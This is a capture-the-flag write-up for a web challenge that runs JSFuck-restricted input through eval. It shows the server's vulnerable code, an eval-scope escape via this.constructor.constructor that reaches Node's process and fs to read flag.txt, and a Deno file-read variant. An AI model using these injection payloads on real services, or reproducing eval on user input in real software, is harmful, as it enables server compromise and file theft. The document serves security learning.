## Solve Process  
We are greeted with this webpage. Trying to input normal javascript code doesn’t work.  
![image31](/static/writeups/photos/image31.png)  
![image32](/static/writeups/photos/image32.png)

Taking a look at the source code, we can see that the server is correctly validating the characters  
```javascript
let d = req.body;
let out = "";
for (let i of ["[", "]", "(", ")", "+", "!"]) {
  d = d.replaceAll(i, "");
}

if (d.trim().length) {
  res.send("ERROR: disallowed characters. Valid characters: '[', ']', '(', ')', '+', and '!'")
  return;
}
```

It should also be noted that the javascript, if verified, will be run by the server through the eval function.  
```javascript
let c;
try {
  c = eval(req.body).toString();
} catch (e) {
  res.send("An error occurred with your code.");
}

// disallow code execution
try {
  if (typeof (eval(c)) === "function") {
    res.send("Attempting to abuse javascript code against jslearning.site is not allowed under any circumstance.");
  }
} catch (e) {}
```
We can also see the endpoint  
```javascript
let flag = fs.readFileSync("flag.txt", "utf-8");
```

I recognised that there is a special form of javascript programming which uses these specific characters, called **JSFuck**. It only uses these specific characters, \[\]()+\!.   
You can convert normal javascript code to JSFuck here:  
[https://jsfuck.com](https://jsfuck.com)

For the next few parts, I will be showcasing the javascript code used. The JSFuck code I used can be found here

First, I tried converting “fun” into the JSFuck to perform a sanity check.  
![image36](/static/writeups/photos/image36.png)

Ok, let's try reading the flag.txt file. (Note that we cant access the flag variable since the flag variable is not in global scope, since it uses the let keyword)  
```javascript
fs.readFileSync("flag.txt", "utf-8");
```
![image38](/static/writeups/photos/image38.png)

Doesn’t work. I took a guess and presumed it was likely because fs was not being required inside the eval’s scope. So i tried to require the fs library.  
```javascript
process.mainModule.require("fs").readFileSync("flag.txt", "utf-8");
```
This didn’t work either. Since the code was being run in an eval, “process” did not exist inside the eval context. 

This is the final payload that works  
```javascript
this.constructor.constructor("return process")()
  .mainModule.require("fs")
  .readFileSync("flag.txt", "utf-8")
```
We needed a way to escape the val context into the global context. this.constructor.constructor refers to the “Function” constructor object in javascript. We can run some code by calling the constructor object, and that code will be run in the **global context**. We use this to retrieve the process variable, and then in order to require our fs library and read the flag file.

![image41](/static/writeups/photos/image41.png)

## Afterword  
After testing this code again, it seems it no longer works. I’m guessing that the admin did a fix of the code to make it less exploitable, so maybe the process variable couldn’t be accessed anymore.  
*(Yes they did, they changed fs.readFileSync to this)*
```javascript
let flag = Deno.readTextFileSync("flag.txt", "utf-8");
```
Anyways, here’s another payload that works. Deno works in the eval context too.   
```javascript
Deno.readTextFileSync("flag.txt");
```
Also on reflection i’m not sure whether my previous code didn't work because someone exploited the challenge, since i only ran my final solution after they restarted the challenge :P 
